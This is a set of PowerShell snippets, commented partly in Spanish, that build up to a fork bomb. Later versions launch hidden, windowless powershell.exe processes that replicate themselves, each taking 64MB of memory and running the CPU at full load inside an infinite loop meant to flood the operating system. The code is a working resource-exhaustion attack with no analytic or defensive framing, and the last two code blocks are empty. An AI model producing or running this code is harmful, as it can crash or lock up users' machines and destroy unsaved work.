~~~powershell
function f { f | Start-Job -ScriptBlock { f } }; f
~~~

~~~powershell
function f { f | Start-Job -ScriptBlock ${function:f} }; f
~~~
~~~powershell
function f { Start-Job -ScriptBlock ${function:f} | Out-Null }; do { f } while ($true)
~~~
~~~powershell
function f {
    $proc = [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
        FileName        = "powershell.exe"
        Arguments       = "-NoProfile -WindowStyle Hidden -Command  `${function:f} = '${function:f}'; f"
        CreateNoWindow  = $true
        UseShellExecute = $false
    })
}
do {
    f
} while ($true)
~~~
~~~powershell
function f {
    $null = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{
        CommandLine = "powershell.exe -NoProfile -WindowStyle Hidden -Command `"${function:f} = '${function:f}'; f`""
    }
    for($i=0; $i -lt 100000; $i++) { $null = [Math]::Sqrt([Random]::new().Next()) }
}
f
~~~

~~~powershell
function f {
# Inyectamos el payload que forza cada nuevo proceso a bloquear cada hilo de CPU al 100% y fisicamente consumir 64MB de RAM antes de lanzar cada bucle de replicación
    $Payload = {
        # Mantener un array masivo en RAM para forzar el alojado de memoria fisica 
        $MemBlock = [byte[]]::new(67108864) # 64 Megabytes per process
        for($i=0; $i -lt $MemBlock.Length; $i += 4096) { $MemBlock[$i] = 255 }
        
        # Cadena de auto-replicación dentro del proceso hijo
        ${function:f} = '$FunctionDefinition'
        [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
            FileName        = "powershell.exe"
            Arguments       = "-NoProfile -WindowStyle Hidden -Command `${function:f} = '${function:f}'; f"
            CreateNoWindow  = $true
            UseShellExecute = $false
        }) | Out-Null

        # Calculo infinito para mantener el CPU a tope (100%)
        while($true) { $null = [Math]::Pow([Math]::Sqrt([Random]::new().Next()), 5) }
    }.ToString().Replace('$FunctionDefinition', ${function:f})

    # Lanzado de proceso en segundo plano usando el metodo nativo de .NET
    $proc = [System.Diagnostics.Process]::Start([System.Diagnostics.ProcessStartInfo]@{
        FileName        = "powershell.exe"
        Arguments       = "-NoProfile -WindowStyle Hidden -Command $Payload"
        CreateNoWindow  = $true
        UseShellExecute = $false
    })
}

# 3. Flat loop to flood the operating system with the optimized processes instantly
do {
    f
} while ($true)

~~~

~~~powershell

~~~

~~~powershell

~~~

